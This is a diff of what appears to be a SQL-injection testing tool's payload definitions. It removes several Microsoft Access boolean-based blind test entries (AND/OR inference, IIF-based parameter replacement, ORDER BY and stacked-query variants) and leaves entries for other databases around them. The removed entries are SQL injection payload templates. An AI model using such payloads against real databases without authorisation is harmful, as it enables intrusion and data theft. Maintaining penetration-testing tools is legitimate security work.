@@ -348,45 +348,7 @@ Tag: <test>
         </details>
     </test>
 
-    <test>
-        <title>AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1</clause>
-        <where>1</where>
-        <vector>AND [INFERENCE]</vector>
-        <request>
-            <payload>AND [RANDNUM]=[RANDNUM]</payload>
-            <comment>%16</comment>
-        </request>
-        <response>
-            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
-        </details>
-    </test>
 
-    <test>
-        <title>OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>3</risk>
-        <clause>1</clause>
-        <where>2</where>
-        <vector>OR [INFERENCE]</vector>
-        <request>
-            <payload>OR [RANDNUM]=[RANDNUM]</payload>
-            <comment>%16</comment>
-        </request>
-        <response>
-            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
-        </details>
-    </test>
 
     <test>
         <title>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
@@ -925,44 +887,6 @@ Tag: <test>
         </details>
     </test>
 
-    <test>
-        <title>Microsoft Access boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,3</clause>
-        <where>3</where>
-        <vector>IIF([INFERENCE],[RANDNUM],1/0)</vector>
-        <request>
-            <payload>IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)</payload>
-        </request>
-        <response>
-            <comparison>IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft Access boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1,3</clause>
-        <where>3</where>
-        <vector>IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
-        <request>
-            <payload>IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
-        </request>
-        <response>
-            <comparison>IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
-        </details>
-    </test>
-
     <!-- Works in MySQL, Oracle, etc. -->
     <test>
         <title>Boolean-based blind - Parameter replace (DUAL)</title>
@@ -1256,43 +1180,7 @@ Tag: <test>
         </details>
     </test>
 
-    <test>
-        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause</title>
-        <stype>1</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,IIF([INFERENCE],1,1/0)</vector>
-        <request>
-            <payload>,IIF([RANDNUM]=[RANDNUM],1,1/0)</payload>
-        </request>
-        <response>
-            <comparison>,IIF([RANDNUM]=[RANDNUM1],1,1/0)</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
-        <stype>1</stype>
-        <level>5</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
-        <request>
-            <payload>,IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)</payload>
-        </request>
-        <response>
-            <comparison>,IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
-        </details>
-    </test>
+   
 
     <test>
         <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause</title>
@@ -1495,26 +1383,6 @@ Tag: <test>
         </response>
         <details>
             <dbms>Oracle</dbms>
-        </details>
-    </test>
-
-    <test>
-        <title>Microsoft Access boolean-based blind - Stacked queries</title>
-        <stype>1</stype>
-        <level>5</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;IIF([INFERENCE],1,1/0)</vector>
-        <request>
-            <payload>;IIF([RANDNUM]=[RANDNUM],1,1/0)</payload>
-            <comment>%16</comment>
-        </request>
-        <response>
-            <comparison>;IIF([RANDNUM]=[RANDNUM1],1,1/0)</comparison>
-        </response>
-        <details>
-            <dbms>Microsoft Access</dbms>
         </details>
     </test>
 
